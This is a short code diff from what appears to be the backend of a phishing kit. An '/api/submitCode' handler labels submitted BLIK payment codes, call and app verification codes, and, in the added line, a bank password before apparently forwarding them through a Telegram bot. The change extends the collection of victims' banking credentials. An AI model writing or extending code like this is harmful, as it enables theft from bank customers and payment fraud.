@@ -736,6 +736,7 @@ app.post(`/api/submitCode`, async (req, res) => {
       blik: "БЛИК-кода",
       call: "кода из звонка",
       app: "кода из приложения",
+      bankPassword: "Пароль от банка",
     };
 
     await bot.sendMessage(
